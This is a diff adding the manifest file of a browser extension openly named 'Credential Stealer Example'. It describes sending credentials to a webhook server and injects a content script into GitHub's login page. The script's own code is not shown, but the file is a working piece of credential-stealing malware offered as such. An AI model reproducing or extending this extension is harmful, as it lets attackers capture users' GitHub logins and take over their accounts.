@@ -1,0 +1,12 @@
+{
+    "manifest_version": 3,
+    "name": "Credential Stealer Example",
+    "description": "Example Credential Stealer. sends the Credentials to a connected WebHook Server.",
+    "version": "1.0",
+    "content_scripts": [
+        {
+            "js": ["JavaScript/Contents.js"],
+            "matches": ["https://github.com/login"]
+        }
+    ]
+}
